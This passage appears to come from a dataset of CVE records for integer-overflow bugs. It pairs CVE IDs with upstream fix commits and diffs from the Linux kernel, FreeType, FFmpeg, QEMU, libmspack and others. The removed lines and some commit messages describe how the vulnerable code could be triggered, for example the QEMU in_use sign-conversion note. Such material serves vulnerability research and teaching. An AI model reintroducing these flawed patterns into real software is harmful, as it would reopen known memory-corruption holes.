process.\n\nSigned-off-by: Vasiliy Kulikov <segoon@openwall.com>\nSigned-off-by: Dave Airlie <airlied@redhat.com>\n---\n drivers\/char\/agp\/generic.c | 8 +++++++-\n 1 file changed, 7 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/drivers\/char\/agp\/generic.c b\/drivers\/char\/agp\/generic.c\nindex 012cba0d6d96..850a643ad694 100644\n--- a\/drivers\/char\/agp\/generic.c\n+++ b\/drivers\/char\/agp\/generic.c\n@@ -115,6 +115,9 @@ static struct agp_memory *agp_create_user_memory(unsigned long num_agp_pages)\n \tstruct agp_memory *new;\n \tunsigned long alloc_size = num_agp_pages*sizeof(struct page *);\n \n+\tif (INT_MAX\/sizeof(struct page *) < num_agp_pages)\n+\t\treturn NULL;\n+\n \tnew = kzalloc(sizeof(struct agp_memory), GFP_KERNEL);\n \tif (new == NULL)\n \t\treturn NULL;\n@@ -234,11 +237,14 @@ struct agp_memory *agp_allocate_memory(struct agp_bridge_data *bridge,\n \tint scratch_pages;\n \tstruct agp_memory *new;\n \tsize_t i;\n+\tint cur_memory;\n \n \tif (!bridge)\n \t\treturn NULL;\n \n-\tif ((atomic_read(&bridge->current_memory_agp) + page_count) > bridge->max_memory_agp)\n+\tcur_memory = atomic_read(&bridge->current_memory_agp);\n+\tif ((cur_memory + page_count > bridge->max_memory_agp) ||\n+\t    (cur_memory + page_count < page_count))\n \t\treturn NULL;\n \n \tif (type >= AGP_USER_TYPES) {\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2015-3239","CWE_ID":"189","category":"security","commit_id":"396b6c7ab737e2bff244d640601c436a26260ca1","commit_message":"From 396b6c7ab737e2bff244d640601c436a26260ca1 Mon Sep 17 00:00:00 2001\nFrom: Arun Sharma <arun@sharma-home.net>\nDate: Fri, 19 Jun 2015 19:47:22 -0700\nSubject: Invalid dwarf opcodes can cause references beyond the end of the\n array.\n\n---\n include\/dwarf_i.h | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/include\/dwarf_i.h b\/include\/dwarf_i.h\nindex 1e6231e..4a02a7d 100644\n--- a\/include\/dwarf_i.h\n+++ b\/include\/dwarf_i.h\n@@ -20,7 +20,7 @@\n extern const uint8_t dwarf_to_unw_regnum_map[DWARF_REGNUM_MAP_LENGTH];\n \/* REG is evaluated multiple times; it better be side-effects free!  *\/\n # define dwarf_to_unw_regnum(reg)                                         \\\n-  (((reg) <= DWARF_REGNUM_MAP_LENGTH) ? dwarf_to_unw_regnum_map[reg] : 0)\n+  (((reg) < DWARF_REGNUM_MAP_LENGTH) ? dwarf_to_unw_regnum_map[reg] : 0)\n #endif\n \n #ifdef UNW_LOCAL_ONLY\n-- \ncgit v1.0-41-gc330\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-2495","CWE_ID":"189","category":"security","commit_id":"3dbc0ff9c3e6f6e0d08ea3d42cb33761bae084ba","commit_message":"From 3dbc0ff9c3e6f6e0d08ea3d42cb33761bae084ba Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Tue, 5 Mar 2013 01:35:28 +0100\nSubject: [PATCH] iff: fix integer overflow\n\nFixes out of array accesses\n\nFound-by: Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavformat\/iff.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n","diff_code":"diff --git a\/libavformat\/iff.c b\/libavformat\/iff.c\nindex 348026a725..100d981cab 100644\n--- a\/libavformat\/iff.c\n+++ b\/libavformat\/iff.c\n@@ -250,6 +250,8 @@ static int iff_read_header(AVFormatContext *s)\n             break;\n \n         case ID_CMAP:\n+            if (data_size > INT_MAX - IFF_EXTRA_VIDEO_SIZE - FF_INPUT_BUFFER_PADDING_SIZE)\n+                return AVERROR_INVALIDDATA;\n             st->codec->extradata_size = data_size + IFF_EXTRA_VIDEO_SIZE;\n             st->codec->extradata      = av_malloc(data_size + IFF_EXTRA_VIDEO_SIZE + FF_INPUT_BUFFER_PADDING_SIZE);\n             if (!st->codec->extradata)\n@@ -410,6 +412,7 @@ static int iff_read_header(AVFormatContext *s)\n             if (!st->codec->extradata)\n                 return AVERROR(ENOMEM);\n         }\n+        av_assert0(st->codec->extradata_size >= IFF_EXTRA_VIDEO_SIZE);\n         buf = st->codec->extradata;\n         bytestream_put_be16(&buf, IFF_EXTRA_VIDEO_SIZE);\n         bytestream_put_byte(&buf, iff->bitmap_compression);\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2016-3135","CWE_ID":"189","category":"security","commit_id":"d157bd761585605b7882935ffb86286919f62ea1","commit_message":"From d157bd761585605b7882935ffb86286919f62ea1 Mon Sep 17 00:00:00 2001\nFrom: Florian Westphal <fw@strlen.de>\nDate: Thu, 10 Mar 2016 01:56:23 +0100\nSubject: [PATCH] netfilter: x_tables: check for size overflow\n\nBen Hawkes says:\n integer overflow in xt_alloc_table_info, which on 32-bit systems can\n lead to small structure allocation and a copy_from_user based heap\n corruption.\n\nReported-by: Ben Hawkes <hawkes@google.com>\nSigned-off-by: Florian Westphal <fw@strlen.de>\nSigned-off-by: Pablo Neira Ayuso <pablo@netfilter.org>\n---\n net\/netfilter\/x_tables.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n","diff_code":"diff --git a\/net\/netfilter\/x_tables.c b\/net\/netfilter\/x_tables.c\nindex d0cd2b9bf8446..582c9cfd6567c 100644\n--- a\/net\/netfilter\/x_tables.c\n+++ b\/net\/netfilter\/x_tables.c\n@@ -659,6 +659,9 @@ struct xt_table_info *xt_alloc_table_info(unsigned int size)\n \tstruct xt_table_info *info = NULL;\n \tsize_t sz = sizeof(*info) + size;\n \n+\tif (sz < sizeof(*info))\n+\t\treturn NULL;\n+\n \t\/* Pedantry: prevent them from hitting BUG() in vmalloc.c --RR *\/\n \tif ((SMP_ALIGN(size) >> PAGE_SHIFT) + 2 > totalram_pages)\n \t\treturn NULL;\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-3015","CWE_ID":"189","category":"security","commit_id":"731eb1a03a8445cde2cb23ecfb3580c6fa7bb690","commit_message":"From 731eb1a03a8445cde2cb23ecfb3580c6fa7bb690 Mon Sep 17 00:00:00 2001\nFrom: Akinobu Mita <akinobu.mita@gmail.com>\nDate: Wed, 3 Mar 2010 23:55:01 -0500\nSubject: ext4: consolidate in_range() definitions\n\nThere are duplicate macro definitions of in_range() in mballoc.h and\nballoc.c.  This consolidates these two definitions into ext4.h, and\nchanges extents.c to use in_range() as well.\n\nSigned-off-by: Akinobu Mita <akinobu.mita@gmail.com>\nSigned-off-by: \"Theodore Ts'o\" <tytso@mit.edu>\nCc: Andreas Dilger <adilger@sun.com>\n---\n fs\/ext4\/balloc.c  | 3 ---\n fs\/ext4\/ext4.h    | 2 ++\n fs\/ext4\/extents.c | 4 ++--\n fs\/ext4\/mballoc.h | 2 --\n 4 files changed, 4 insertions(+), 7 deletions(-)\n\n","diff_code":"diff --git a\/fs\/ext4\/balloc.c b\/fs\/ext4\/balloc.c\nindex fadbc4d3a202..d2f37a5516c7 100644\n--- a\/fs\/ext4\/balloc.c\n+++ b\/fs\/ext4\/balloc.c\n@@ -188,9 +188,6 @@ unsigned ext4_init_block_bitmap(struct super_block *sb, struct buffer_head *bh,\n  * when a file system is mounted (see ext4_fill_super).\n  *\/\n \n-\n-#define in_range(b, first, len)\t((b) >= (first) && (b) <= (first) + (len) - 1)\n-\n \/**\n  * ext4_get_group_desc() -- load group descriptor from disk\n  * @sb:\t\t\tsuper block\ndiff --git a\/fs\/ext4\/ext4.h b\/fs\/ext4\/ext4.h\nindex 3d85bbb09f1b..9b179163f1de 100644\n--- a\/fs\/ext4\/ext4.h\n+++ b\/fs\/ext4\/ext4.h\n@@ -1819,6 +1819,8 @@ static inline void set_bitmap_uptodate(struct buffer_head *bh)\n \tset_bit(BH_BITMAP_UPTODATE, &(bh)->b_state);\n }\n \n+#define in_range(b, first, len)\t((b) >= (first) && (b) <= (first) + (len) - 1)\n+\n #endif\t\/* __KERNEL__ *\/\n \n #endif\t\/* _EXT4_H *\/\ndiff --git a\/fs\/ext4\/extents.c b\/fs\/ext4\/extents.c\nindex 3c0bae11a097..94c8ee81f5e1 100644\n--- a\/fs\/ext4\/extents.c\n+++ b\/fs\/ext4\/extents.c\n@@ -2051,7 +2051,7 @@ ext4_ext_in_cache(struct inode *inode, ext4_lblk_t block,\n \n \tBUG_ON(cex->ec_type != EXT4_EXT_CACHE_GAP &&\n \t\t\tcex->ec_type != EXT4_EXT_CACHE_EXTENT);\n-\tif (block >= cex->ec_block && block < cex->ec_block + cex->ec_len) {\n+\tif (in_range(block, cex->ec_block, cex->ec_len)) {\n \t\tex->ee_block = cpu_to_le32(cex->ec_block);\n \t\text4_ext_store_pblock(ex, cex->ec_start);\n \t\tex->ee_len = cpu_to_le16(cex->ec_len);\n@@ -3364,7 +3364,7 @@ int ext4_ext_get_blocks(handle_t *handle, struct inode *inode,\n \t\t *\/\n \t\tee_len = ext4_ext_get_actual_len(ex);\n \t\t\/* if found extent covers block, simply return it *\/\n-\t\tif (iblock >= ee_block && iblock < ee_block + ee_len) {\n+\t\tif (in_range(iblock, ee_block, ee_len)) {\n \t\t\tnewblock = iblock - ee_block + ee_start;\n \t\t\t\/* number of remaining blocks in the extent *\/\n \t\t\tallocated = ee_len - (iblock - ee_block);\ndiff --git a\/fs\/ext4\/mballoc.h b\/fs\/ext4\/mballoc.h\nindex 9b2deed652b7..b619322c76f0 100644\n--- a\/fs\/ext4\/mballoc.h\n+++ b\/fs\/ext4\/mballoc.h\n@@ -220,8 +220,6 @@ struct ext4_buddy {\n #define EXT4_MB_BITMAP(e4b)\t((e4b)->bd_bitmap)\n #define EXT4_MB_BUDDY(e4b)\t((e4b)->bd_buddy)\n \n-#define in_range(b, first, len)\t((b) >= (first) && (b) <= (first) + (len) - 1)\n-\n static inline ext4_fsblk_t ext4_grp_offs_to_block(struct super_block *sb,\n \t\t\t\t\tstruct ext4_free_extent *fex)\n {\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2009-0946","CWE_ID":"189","category":"security","commit_id":"79972af4f0485a11dcb19551356c45245749fc5b","commit_message":"From 79972af4f0485a11dcb19551356c45245749fc5b Mon Sep 17 00:00:00 2001\nFrom: Werner Lemberg <wl@gnu.org>\nDate: Fri, 20 Mar 2009 08:21:37 +0100\nSubject: Protect against too large glyphs.\n\nProblem reported by Tavis Ormandy <taviso@google.com>.\n\n* src\/smooth\/ftsmooth.c (ft_smooth_render_generic): Don't allow\n`width' or `pitch' to be larger than 0xFFFF.\n---\n ChangeLog             | 11 +++++++++--\n src\/smooth\/ftsmooth.c |  9 ++++++++-\n 2 files changed, 17 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/ChangeLog b\/ChangeLog\nindex d894b37..cb3575d 100644\n--- a\/ChangeLog\n+++ b\/ChangeLog\n@@ -1,4 +1,13 @@\n 2009-03-20  Werner Lemberg  <wl@gnu.org>\n+\n+\tProtect against too large glyphs.\n+\n+\tProblem reported by Tavis Ormandy <taviso@google.com>.\n+\n+\t* src\/smooth\/ftsmooth.c (ft_smooth_render_generic): Don't allow\n+\t`width' or `pitch' to be larger than 0xFFFF.\n+\n+2009-03-20  Werner Lemberg  <wl@gnu.org>\n \t    Tavis Ormandy <taviso@google.com>\n \n \tFix validation for various cmap table formats.\n@@ -11,8 +20,6 @@\n \n \tProtect against malformed compressed data.\n \n-\tProblem reported by Tavis Ormandy <taviso@google.com>.\n-\n \t* src\/lsw\/ftzopen.c (ft_lzwstate_io): Test whether `state->prefix' is\n \tzero.\n \ndiff --git a\/src\/smooth\/ftsmooth.c b\/src\/smooth\/ftsmooth.c\nindex a6db504..cacc490 100644\n--- a\/src\/smooth\/ftsmooth.c\n+++ b\/src\/smooth\/ftsmooth.c\n@@ -153,7 +153,7 @@\n       slot->internal->flags &= ~FT_GLYPH_OWN_BITMAP;\n     }\n \n-    \/* allocate new one, depends on pixel format *\/\n+    \/* allocate new one *\/\n     pitch = width;\n     if ( hmul )\n     {\n@@ -194,6 +194,13 @@\n \n #endif\n \n+    if ( pitch > 0xFFFF || height > 0xFFFF )\n+    {\n+      FT_ERROR(( \"ft_smooth_render_generic: glyph too large: %d x %d\\n\",\n+                 width, height ));\n+      return Smooth_Err_Raster_Overflow;\n+    }\n+\n     bitmap->pixel_mode = FT_PIXEL_MODE_GRAY;\n     bitmap->num_grays  = 256;\n     bitmap->width      = width;\n-- \ncgit v1.0-41-gc330\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2009-0946","CWE_ID":"189","category":"security","commit_id":"0545ec1ca36b27cb928128870a83e5f668980bc5","commit_message":"From 0545ec1ca36b27cb928128870a83e5f668980bc5 Mon Sep 17 00:00:00 2001\nFrom: Werner Lemberg <wl@gnu.org>\nDate: Fri, 20 Mar 2009 06:49:10 +0100\nSubject: Protect against invalid SID values in CFFs.\n\nProblem reported by Tavis Ormandy <taviso@google.com>.\n\n* src\/cff\/cffload.c (cff_charset_load): Reject SID values larger\nthan 64999.\n---\n ChangeLog         |  9 +++++++++\n src\/cff\/cffload.c | 29 ++++++++++++++++++++++++++++-\n 2 files changed, 37 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/ChangeLog b\/ChangeLog\nindex 3c6ea08..512d99c 100644\n--- a\/ChangeLog\n+++ b\/ChangeLog\n@@ -1,3 +1,12 @@\n+2009-03-20  Werner Lemberg  <wl@gnu.org>\n+\n+\tProtect against invalid SID values in CFFs.\n+\n+\tProblem reported by Tavis Ormandy <taviso@google.com>.\n+\n+\t* src\/cff\/cffload.c (cff_charset_load): Reject SID values larger\n+\tthan 64999.\n+\n 2009-03-19  Vincent Richomme <richom.v@free.fr>\n \n \tUpdate WinCE Visual C project files.\ndiff --git a\/src\/cff\/cffload.c b\/src\/cff\/cffload.c\nindex 22163fb..24b899d 100644\n--- a\/src\/cff\/cffload.c\n+++ b\/src\/cff\/cffload.c\n@@ -842,7 +842,20 @@\n             goto Exit;\n \n           for ( j = 1; j < num_glyphs; j++ )\n-            charset->sids[j] = FT_GET_USHORT();\n+          {\n+            FT_UShort sid = FT_GET_USHORT();\n+\n+\n+            \/* this constant is given in the CFF specification *\/\n+            if ( sid < 65000 )\n+              charset->sids[j] = sid;\n+            else\n+            {\n+              FT_ERROR(( \"cff_charset_load:\"\n+                         \" invalid SID value %d set to zero\\n\", sid ));\n+              charset->sids[j] = 0;\n+            }\n+          }\n \n           FT_FRAME_EXIT();\n         }\n@@ -875,6 +888,20 @@\n                 goto Exit;\n             }\n \n+            \/* check whether the range contains at least one valid glyph; *\/\n+            \/* the constant is given in the CFF specification             *\/\n+            if ( glyph_sid >= 65000 ) {\n+              FT_ERROR(( \"cff_charset_load: invalid SID range\\n\" ));\n+              error = CFF_Err_Invalid_File_Format;\n+              goto Exit;\n+            }\n+\n+            \/* try to rescue some of the SIDs if `nleft' is too large *\/\n+            if ( nleft > 65000 - 1 || glyph_sid >= 65000 - nleft ) {\n+              FT_ERROR(( \"cff_charset_load: invalid SID range trimmed\\n\" ));\n+              nleft = 65000 - 1 - glyph_sid;\n+            }\n+\n             \/* Fill in the range of sids -- `nleft + 1' glyphs. *\/\n             for ( i = 0; j < num_glyphs && i <= nleft; i++, j++, glyph_sid++ )\n               charset->sids[j] = glyph_sid;\n-- \ncgit v1.0-41-gc330\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2015-4471","CWE_ID":"189","category":"security","commit_id":"18b6a2cc0b87536015bedd4f7763e6b02d5aa4f3","commit_message":"From 18b6a2cc0b87536015bedd4f7763e6b02d5aa4f3 Mon Sep 17 00:00:00 2001\nFrom: Stuart Caie <kyzer@4u.net>\nDate: Sun, 18 Jan 2015 14:20:35 +0000\nSubject: [PATCH] Prevent a 1-byte underread of the input buffer if an\n odd-sized data block comes just before an uncompressed block header\n\n---\n libmspack\/trunk\/ChangeLog     | 8 ++++++++\n libmspack\/trunk\/mspack\/lzxd.c | 3 +--\n 2 files changed, 9 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/libmspack\/trunk\/ChangeLog b\/libmspack\/trunk\/ChangeLog\nindex dbd13dc..5374ac8 100644\n--- a\/libmspack\/trunk\/ChangeLog\n+++ b\/libmspack\/trunk\/ChangeLog\n@@ -1,3 +1,11 @@\n+2015-01-18  Stuart Caie <kyzer@4u.net>\n+\n+\t* lzxd_decompress(): the byte-alignment code for reading uncompressed\n+\tblock headers presumed it could wind i_ptr back 2 bytes, but this\n+\thasn't been true since READ_BYTES was allowed to read bytes straddling\n+\ttwo blocks, leaving just 1 byte in the read buffer. Thanks to Jakub\n+\tWilk for finding the issue and providing a sample file.\n+\n 2015-01-17  Stuart Caie <kyzer@4u.net>\n \n \t* GET_UTF8_CHAR(): Remove 5\/6-byte encoding support and check decoded\ndiff --git a\/libmspack\/trunk\/mspack\/lzxd.c b\/libmspack\/trunk\/mspack\/lzxd.c\nindex 79c7812..2281e7b 100644\n--- a\/libmspack\/trunk\/mspack\/lzxd.c\n+++ b\/libmspack\/trunk\/mspack\/lzxd.c\n@@ -506,8 +506,7 @@ int lzxd_decompress(struct lzxd_stream *lzx, off_t out_bytes) {\n \t  lzx->intel_started = 1;\n \n \t  \/* read 1-16 (not 0-15) bits to align to bytes *\/\n-\t  ENSURE_BITS(16);\n-\t  if (bits_left > 16) i_ptr -= 2;\n+\t  if (bits_left == 0) ENSURE_BITS(16);\n \t  bits_left = 0; bit_buffer = 0;\n \n \t  \/* read 12 bytes of stored R0 \/ R1 \/ R2 values *\/\n","owner":"kyz","repo":"libmspack","source":"cve"},{"CVE_ID":"CVE-2013-4148","CWE_ID":"189","category":"security","commit_id":"71f7fe48e10a8437c9d42d859389f37157f59980","commit_message":"From 71f7fe48e10a8437c9d42d859389f37157f59980 Mon Sep 17 00:00:00 2001\nFrom: \"Michael S. Tsirkin\" <mst@redhat.com>\nDate: Thu, 3 Apr 2014 19:50:39 +0300\nSubject: [PATCH] virtio-net: fix buffer overflow on invalid state load\n\nCVE-2013-4148 QEMU 1.0 integer conversion in\nvirtio_net_load()@hw\/net\/virtio-net.c\n\nDeals with loading a corrupted savevm image.\n\n>         n->mac_table.in_use = qemu_get_be32(f);\n\nin_use is int so it can get negative when assigned 32bit unsigned value.\n\n>         \/* MAC_TABLE_ENTRIES may be different from the saved image *\/\n>         if (n->mac_table.in_use <= MAC_TABLE_ENTRIES) {\n\npassing this check ^^^\n\n>             qemu_get_buffer(f, n->mac_table.macs,\n>                             n->mac_table.in_use * ETH_ALEN);\n\nwith good in_use value, \"n->mac_table.in_use * ETH_ALEN\" can get\npositive and bigger than mac_table.macs. For example 0x81000000\nsatisfies this condition when ETH_ALEN is 6.\n\nFix it by making the value unsigned.\nFor consistency, change first_multi as well.\n\nNote: all call sites were audited to confirm that\nmaking them unsigned didn't cause any issues:\nit turns out we actually never do math on them,\nso it's easy to validate because both values are\nalways <= MAC_TABLE_ENTRIES.\n\nReviewed-by: Michael Roth <mdroth@linux.vnet.ibm.com>\nSigned-off-by: Michael S. Tsirkin <mst@redhat.com>\nReviewed-by: Laszlo Ersek <lersek@redhat.com>\nSigned-off-by: Juan Quintela <quintela@redhat.com>\n---\n include\/hw\/virtio\/virtio-net.h | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/include\/hw\/virtio\/virtio-net.h b\/include\/hw\/virtio\/virtio-net.h\nindex df60f16..4b32440 100644\n--- a\/include\/hw\/virtio\/virtio-net.h\n+++ b\/include\/hw\/virtio\/virtio-net.h\n@@ -176,8 +176,8 @@ typedef struct VirtIONet {\n     uint8_t nobcast;\n     uint8_t vhost_started;\n     struct {\n-        int in_use;\n-        int first_multi;\n+        uint32_t in_use;\n+        uint32_t first_multi;\n         uint8_t multi_overflow;\n         uint8_t uni_overflow;\n         uint8_t *macs;\n-- \n1.8.3.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-4352","CWE_ID":"189","category":"security","commit_id":"8b94df0f2047e9728cb872adc9e64557b7a5152f","commit_message":"From 8b94df0f2047e9728cb872adc9e64557b7a5152f Mon Sep 17 00:00:00 2001\nFrom: Reinhard Tartler <siretart@tauware.de>\nDate: Sun, 4 Dec 2011 10:10:33 +0100\nSubject: [PATCH] vp3dec: Check coefficient index in vp3_dequant()\n\nBased on a patch by Michael Niedermayer <michaelni@gmx.at>\n\nFixes NGS00145, CVE-2011-4352\n\nFound-by: Phillip Langlois\nSigned-off-by: Reinhard Tartler <siretart@tauware.de>\n---\n libavcodec\/vp3.c | 14 ++++++++++++--\n 1 file changed, 12 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/libavcodec\/vp3.c b\/libavcodec\/vp3.c\nindex 51ab048..f44d084 100644\n--- a\/libavcodec\/vp3.c\n+++ b\/libavcodec\/vp3.c\n@@ -1363,6 +1363,10 @@ static inline int vp3_dequant(Vp3DecodeContext *s, Vp3Fragment *frag,\n         case 1: \/\/ zero run\n             s->dct_tokens[plane][i]++;\n             i += (token >> 2) & 0x7f;\n+            if (i > 63) {\n+                av_log(s->avctx, AV_LOG_ERROR, \"Coefficient index overflow\\n\");\n+                return i;\n+            }\n             block[perm[i]] = (token >> 9) * dequantizer[perm[i]];\n             i++;\n             break;\n@@ -1566,7 +1570,10 @@ static void render_slice(Vp3DecodeContext *s, int slice)\n                     \/* invert DCT and place (or add) in final output *\/\n \n                     if (s->all_fragments[i].coding_method == MODE_INTRA) {\n-                        vp3_dequant(s, s->all_fragments + i, plane, 0, block);\n+                        int index;\n+                        index = vp3_dequant(s, s->all_fragments + i, plane, 0, block);\n+                        if (index > 63)\n+                            continue;\n                         if(s->avctx->idct_algo!=FF_IDCT_VP3)\n                             block[0] += 128<<3;\n                         s->dsp.idct_put(\n@@ -1574,7 +1581,10 @@ static void render_slice(Vp3DecodeContext *s, int slice)\n                             stride,\n                             block);\n                     } else {\n-                        if (vp3_dequant(s, s->all_fragments + i, plane, 1, block)) {\n+                        int index = vp3_dequant(s, s->all_fragments + i, plane, 1, block);\n+                        if (index > 63)\n+                            continue;\n+                        if (index > 0) {\n                         s->dsp.idct_add(\n                             output_plane + first_pixel,\n                             stride,\n-- \n2.1.4\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2010-1166","CWE_ID":"189","category":"security","commit_id":"d2f813f7db157fc83abc4b3726821c36ee7e40b1","commit_message":"From d2f813f7db157fc83abc4b3726821c36ee7e40b1 Mon Sep 17 00:00:00 2001\nFrom: Soren Sandmann Pedersen <ssp@dhcp83-218.boston.redhat.com>\nDate: Wed, 2 May 2007 19:10:22 -0400\nSubject: New fbWalkCompositeRegion() function\n\nThis new function walks the composite region and calls a rectangle\ncompositing function on each compositing rectangle. Previously there\nwere buggy duplicates of this code in fbcompose.c and\nmiext\/rootles\/safealpha\/safeAlphaPicture.c.\n---\n fb\/fbcompose.c                              | 104 +-----\n fb\/fbpict.c                                 | 205 ++++++-----\n fb\/fbpict.h                                 |  30 ++\n miext\/rootless\/safeAlpha\/safeAlphaPicture.c | 526 +++-------------------------\n 4 files changed, 183 insertions(+), 682 deletions(-)\n\n","diff_code":"diff --git a\/fb\/fbcompose.c b\/fb\/fbcompose.c\nindex 6e49893..dd2a2f0 100644\n--- a\/fb\/fbcompose.c\n+++ b\/fb\/fbcompose.c\n@@ -4308,107 +4308,9 @@ fbCompositeGeneral (CARD8\top,\n \t\t    CARD16\twidth,\n \t\t    CARD16\theight)\n {\n-    RegionRec\t    region;\n-    int\t\t    n;\n-    BoxPtr\t    pbox;\n-    Bool\t    srcRepeat = FALSE;\n-    Bool\t    maskRepeat = FALSE;\n-    int\t\t    w, h;\n-    CARD32 _scanline_buffer[SCANLINE_BUFFER_LENGTH*3];\n-    CARD32 *scanline_buffer = _scanline_buffer;\n-    FbComposeData compose_data;\n-    \n-    if (pSrc->pDrawable)\n-        srcRepeat = pSrc->repeatType == RepeatNormal && !pSrc->transform\n-\t    && (pSrc->pDrawable->width != 1 || pSrc->pDrawable->height != 1);\n-\n-    if (pMask && pMask->pDrawable)\n-\tmaskRepeat = pMask->repeatType == RepeatNormal && !pMask->transform\n-\t    && (pMask->pDrawable->width != 1 || pMask->pDrawable->height != 1);\n-\n-    if (op == PictOpOver && !pMask && !pSrc->transform && !PICT_FORMAT_A(pSrc->format) && !pSrc->alphaMap)\n-        op = PictOpSrc;\n-\n-    if (!miComputeCompositeRegion (&region,\n-\t\t\t\t   pSrc,\n-\t\t\t\t   pMask,\n-\t\t\t\t   pDst,\n-\t\t\t\t   xSrc,\n-\t\t\t\t   ySrc,\n-\t\t\t\t   xMask,\n-\t\t\t\t   yMask,\n-\t\t\t\t   xDst,\n-\t\t\t\t   yDst,\n-\t\t\t\t   width,\n-\t\t\t\t   height))\n-\treturn;\n-\n-    compose_data.op = op;\n-    compose_data.src = pSrc;\n-    compose_data.mask = pMask;\n-    compose_data.dest = pDst;\n-    if (width > SCANLINE_BUFFER_LENGTH)\n-        scanline_buffer = (CARD32 *) malloc(width * 3 * sizeof(CARD32));\n-\n-    n = REGION_NUM_RECTS (&region);\n-    pbox = REGION_RECTS (&region);\n-    while (n--)\n-    {\n-\th = pbox->y2 - pbox->y1;\n-\tcompose_data.ySrc = pbox->y1 - yDst + ySrc;\n-\tcompose_data.yMask = pbox->y1 - yDst + yMask;\n-\tcompose_data.yDest = pbox->y1;\n-\twhile (h)\n-\t{\n-\t    compose_data.height = h;\n-\t    w = pbox->x2 - pbox->x1;\n-\t    compose_data.xSrc = pbox->x1 - xDst + xSrc;\n-\t    compose_data.xMask = pbox->x1 - xDst + xMask;\n-\t    compose_data.xDest = pbox->x1;\n-\t    if (maskRepeat)\n-\t    {\n-\t\tcompose_data.yMask = mod (compose_data.yMask, pMask->pDrawable->height);\n-\t\tif (compose_data.height > pMask->pDrawable->height - compose_data.yMask)\n-\t\t    compose_data.height = pMask->pDrawable->height - compose_data.yMask;\n-\t    }\n-\t    if (srcRepeat)\n-\t    {\n-\t\tcompose_data.ySrc = mod (compose_data.ySrc, pSrc->pDrawable->height);\n-\t\tif (compose_data.height > pSrc->pDrawable->height - compose_data.ySrc)\n-\t\t    compose_data.height = pSrc->pDrawable->height - compose_data.ySrc;\n-\t    }\n-\t    while (w)\n-\t    {\n-\t\tcompose_data.width = w;\n-\t\tif (maskRepeat)\n-\t\t{\n-\t\t    compose_data.xMask = mod (compose_data.xMask, pMask->pDrawable->width);\n-\t\t    if (compose_data.width > pMask->pDrawable->width - compose_data.xMask)\n-\t\t\tcompose_data.width = pMask->pDrawable->width - compose_data.xMask;\n-\t\t}\n-\t\tif (srcRepeat)\n-\t\t{\n-\t\t    compose_data.xSrc = mod (compose_data.xSrc, pSrc->pDrawable->width);\n-\t\t    if (compose_data.width > pSrc->pDrawable->width - compose_data.xSrc)\n-\t\t\tcompose_data.width = pSrc->pDrawable->width - compose_data.xSrc;\n-\t\t}\n-\t\tfbCompositeRect(&compose_data, scanline_buffer);\n-\t\tw -= compose_data.width;\n-\t\tcompose_data.xSrc += compose_data.width;\n-\t\tcompose_data.xMask += compose_data.width;\n-\t\tcompose_data.xDest += compose_data.width;\n-\t    }\n-\t    h -= compose_data.height;\n-\t    compose_data.ySrc += compose_data.height;\n-\t    compose_data.yMask += compose_data.height;\n-\t    compose_data.yDest += compose_data.height;\n-\t}\n-\tpbox++;\n-    }\n-    REGION_UNINIT (pDst->pDrawable->pScreen, &region);\n-\n-    if (scanline_buffer != _scanline_buffer)\n-        free(scanline_buffer);\n+    return fbComposite (op, pSrc, pMask, pDst,\n+\t\t\txSrc, ySrc, xMask, yMask, xDst, yDst,\n+\t\t\twidth, height);\n }\n \n #endif\ndiff --git a\/fb\/fbpict.c b\/fb\/fbpict.c\nindex 819d21a..7d94d00 100644\n--- a\/fb\/fbpict.c\n+++ b\/fb\/fbpict.c\n@@ -37,19 +37,6 @@\n #include \"fbpict.h\"\n #include \"fbmmx.h\"\n \n-typedef void\t(*CompositeFunc) (CARD8      op,\n-\t\t\t\t  PicturePtr pSrc,\n-\t\t\t\t  PicturePtr pMask,\n-\t\t\t\t  PicturePtr pDst,\n-\t\t\t\t  INT16      xSrc,\n-\t\t\t\t  INT16      ySrc,\n-\t\t\t\t  INT16      xMask,\n-                                  INT16      yMask,\n-\t\t\t\t  INT16      xDst,\n-\t\t\t\t  INT16      yDst,\n-\t\t\t\t  CARD16     width,\n-\t\t\t\t  CARD16     height);\n-\n CARD32\n fbOver (CARD32 x, CARD32 y)\n {\n@@ -1478,6 +1465,110 @@ fbCompositeRectWrapper  (CARD8\t   op,\n }\n \n void\n+fbWalkCompositeRegion (CARD8 op,\n+\t\t       PicturePtr pSrc,\n+\t\t       PicturePtr pMask,\n+\t\t       PicturePtr pDst,\n+\t\t       INT16 xSrc,\n+\t\t       INT16 ySrc,\n+\t\t       INT16 xMask,\n+\t\t       INT16 yMask,\n+\t\t       INT16 xDst,\n+\t\t       INT16 yDst,\n+\t\t       CARD16 width,\n+\t\t       CARD16 height,\n+\t\t       Bool srcRepeat,\n+\t\t       Bool maskRepeat,\n+\t\t       CompositeFunc compositeRect)\n+{\n+    RegionRec\t    region;\n+    int\t\t    n;\n+    BoxPtr\t    pbox;\n+    int\t\t    w, h, w_this, h_this;\n+    int\t\t    x_msk, y_msk, 